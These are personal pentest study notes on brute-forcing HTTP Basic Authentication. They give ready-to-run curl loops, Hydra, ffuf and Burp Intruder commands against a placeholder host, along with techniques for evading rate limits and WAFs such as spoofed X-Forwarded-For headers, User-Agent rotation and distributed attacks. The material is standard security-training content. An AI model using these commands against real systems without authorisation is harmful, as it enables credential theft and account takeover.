#webapplications

HTTP Basic Authentication sends credentials as a Base64-encoded header on every request. While simple, it's vulnerable to credential attacks if the endpoint doesn't enforce rate limiting.

---

## HTTP Basic Authentication Basics

### How it works
```
Authorization: Basic base64(username:password)
```

**Example:**
```
GET /admin HTTP/1.1
Host: target.com
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
```

The string `YWRtaW46cGFzc3dvcmQxMjM=` decodes to `admin:password123`.

### Identify Basic Auth endpoints
```bash
# Look for 401 Unauthorized responses
curl -v http://target.com/admin
# Response: WWW-Authenticate: Basic realm="Admin Panel"
```

---

## Brute Forcing with curl

### Single attempt
```bash
curl -u admin:password123 http://target.com/admin
```

**Response on success:** 200 OK (returns page content)
**Response on failure:** 401 Unauthorized (returns "Invalid credentials")

### Basic loop (slow)
```bash
for pass in password admin 123456 password123; do
  response=$(curl -s -u admin:"$pass" http://target.com/admin)
  if [[ ! "$response" =~ "401\|Unauthorized" ]]; then
    echo "[+] Found: admin:$pass"
    break
  fi
done
```

---

## Brute Forcing with Hydra

### Basic auth attack
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt basic://target.com/admin
```

**Flags:**
- `-l admin` — username (single)
- `-L users.txt` — usernames (list)
- `-P rockyou.txt` — password wordlist
- `basic://target.com/path` — target endpoint
- `-t 4` — 4 parallel threads
- `-w 5` — 5 second delay between attempts

### Against rate limiting (slower)
```bash
hydra -l admin -P rockyou.txt -t 1 -w 10 basic://target.com/admin
# -t 1 = single thread, -w 10 = 10 second wait
```

### Test multiple users
```bash
hydra -L users.txt -P passwords.txt basic://target.com/admin
```

---

## Brute Forcing with ffuf

### Basic auth fuzzing
```bash
ffuf -w users.txt:USER -w passwords.txt:PASS \
  -u "http://target.com/admin" \
  -H "Authorization: Basic ##USER##:##PASS##@base64" \
  -fc 401
```

**Better approach (pre-encode):**
```bash
# Create a list of base64-encoded credentials
for user in admin root test; do
  for pass in password 123456 admin; do
    echo "Basic $(echo -n "$user:$pass" | base64)" >> auth.txt
  done
done

# Fuzz with the list
ffuf -w auth.txt \
  -u "http://target.com/admin" \
  -H "Authorization: ##WORDLIST##" \
  -fc 401 -fw 100
```

---

## Brute Forcing with Burp Intruder

### Workflow
1. **Capture a request** to the protected endpoint
2. **Send to Intruder**
3. **Set payload position** in the Authorization header:
   ```
   Authorization: Basic §YWRtaW46cGFzc3dvcmQxMjM=§
   ```
4. **Create payloads:**
   - Load username list
   - Load password list
   - Use "Cluster bomb" attack type (all username × password combinations)
5. **Process payloads:** Add rule to Base64-encode before sending
6. **Sort results** by status code (200 = success, 401 = failure)

### Manual Repeater approach
```
GET /admin HTTP/1.1
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
```

1. Manually change credentials in Authorization header
2. Send request
3. Look for 200 OK (success) vs 401 Unauthorized (failure)

---

## Base64 Encoding Credentials

### Encode in bash
```bash
echo -n "admin:password123" | base64
# Output: YWRtaW46cGFzc3dvcmQxMjM=
```

### Decode in bash
```bash
echo "YWRtaW46cGFzc3dvcmQxMjM=" | base64 -d
# Output: admin:password123
```

### Pre-generate credential list
```bash
for user in $(cat users.txt); do
  for pass in $(cat passwords.txt); do
    cred="$user:$pass"
    encoded=$(echo -n "$cred" | base64)
    echo "Basic $encoded"
  done
done > credentials.txt
```

---

## Detection Methods

### Check response codes
```bash
# Success: 200 OK
# Failure: 401 Unauthorized
# Rate limit: 429 Too Many Requests, 403 Forbidden
```

### Check response content
```bash
# Successful auth returns page content
# Failed auth returns: "Authorization Required" or similar

curl -s -u admin:wrongpass http://target.com/admin | grep -i "authorization\|unauthorized"
```

### Timing attacks
Some systems process valid credentials slower (check password hash) than invalid ones. **Valid credentials may take longer.**

---

## Rate Limiting & WAF Bypass

### Detect rate limiting
```bash
# Send 50 requests quickly
for i in {1..50}; do
  curl -s -u admin:pass$i http://target.com/admin -w "%{http_code}\n"
done | sort | uniq -c

# Look for sudden drops to 429 or 403
```

### Bypass techniques

| Technique | Implementation |
| --- | --- |
| **Slow down** | Hydra: `-w 10` (10s delay) |
| **Different endpoints** | If `/admin` rate-limited, try `/api/admin`, `/admin.php` |
| **X-Forwarded-For header** | `curl -H "X-Forwarded-For: 1.2.3.4" ...` (fake IP) |
| **User-Agent rotation** | Change User-Agent per request |
| **Session variation** | Use different Cookie per request |
| **Distributed attack** | Run from multiple IPs simultaneously |
| **Off-peak timing** | Brute force at night |

### Hydra with evasion
```bash
hydra -l admin -P rockyou.txt \
  -t 1 \        # 1 thread
  -w 15 \       # 15s between attempts
  -H "X-Forwarded-For: random" \
  basic://target.com/admin
```

---

## Common Vulnerabilities

| Flaw | Impact |
| --- | --- |
| **No rate limiting** | Unlimited brute force attempts |
| **Default credentials** | Easy bypass with known defaults |
| **Weak password policy** | Users choose common passwords |
| **No account lockout** | Infinite retries allowed |
| **Basic auth over HTTP** | Credentials visible in traffic (use HTTPS test only) |
| **Basic auth in URL** | `http://admin:password@target.com` — logs the credential |

---

## Complete Attack Workflow

### Step 1: Identify Basic Auth
```bash
curl -v http://target.com/admin
# Look for: HTTP/1.1 401 Unauthorized
# Header: WWW-Authenticate: Basic realm="..."
```

### Step 2: Test common credentials
```bash
for cred in "admin:admin" "admin:password" "root:root"; do
  user=$(echo "$cred" | cut -d: -f1)
  pass=$(echo "$cred" | cut -d: -f2)
  curl -s -u "$user:$pass" http://target.com/admin | grep -q "dashboard" && echo "[+] Found: $cred"
done
```

### Step 3: Brute force with Hydra
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -w 5 basic://target.com/admin
```

### Step 4: Verify credentials
```bash
curl -u admin:foundpassword http://target.com/admin -v
# Should see: HTTP/1.1 200 OK
```

---

## Tools needed

- **curl** — manual testing
- **Hydra** — parallel brute forcing
- **ffuf** — flexible fuzzing
- **Burp Suite** — interactive Intruder module
- **base64** — encode/decode credentials
- **Wordlists** — rockyou.txt, custom lists

---

**See also:**
- [[Web Login Brute Force]] — form-based login brute forcing
- [[Session & Cookie Security]] — authentication weaknesses
- [[HTTP Requests]] — request anatomy and headers
